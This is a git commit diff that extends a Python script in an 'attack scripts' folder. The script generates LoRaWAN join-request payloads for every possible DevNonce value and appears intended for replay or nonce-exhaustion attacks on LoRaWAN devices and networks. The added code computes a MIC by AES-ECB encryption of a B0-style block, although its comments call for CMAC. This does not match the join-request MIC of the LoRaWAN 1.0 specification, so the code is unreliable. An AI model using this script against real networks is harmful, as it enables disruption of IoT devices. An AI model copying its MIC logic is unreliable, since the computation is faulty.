867c3c026033a75d95febce21a60bf8e5aa20448
Axel Mat <72404877+lord-seam@users.noreply.github.com>
2023-05-15 17:53:34 +0200

    Update joinrequestgen.py
    Generate all possible join request payload

--- attack scripts /joinrequestgen.py
+++ attack scripts /joinrequestgen.py
@@ -19,3 +19,21 @@ for DevNonce_int in range(0, 65536):
                       binascii.unhexlify(AppEUI)[::-1],  # Little endian
                       binascii.unhexlify(DevEUI)[::-1],  # Little endian
                       DevNonce_int)  # Little endian
+
+    # Prepare B0 block for cmac computation
+    # 0x49 is the constant value used in MIC computation for Join Request in LoRaWAN 1.0
+    # Remaining values are zero-padded as per LoRaWAN 1.0 specification for cmac computation
+    B0 = b'\x49' + b'\x00' * 7 + b'\x00' + b'\x00' + b'\x00' + b'\x00' + struct.pack(">B", len(msg)) + msg
+
+    # Calculate the MIC
+    key = binascii.unhexlify(AppKey)
+    cipher = AES.new(key, AES.MODE_ECB)
+    mic = cipher.encrypt(B0)[-4:]
+
+    # Append the MIC to the end of the message
+    msg += mic
+
+    # Base64 encode the message
+    msg_base64 = base64.b64encode(msg)
+
+    print(f"DevNonce: {DevNonce_int}, Join Request (hex): {binascii.hexlify(msg).decode()}, Join Request (base64): {msg_base64.decode()}")
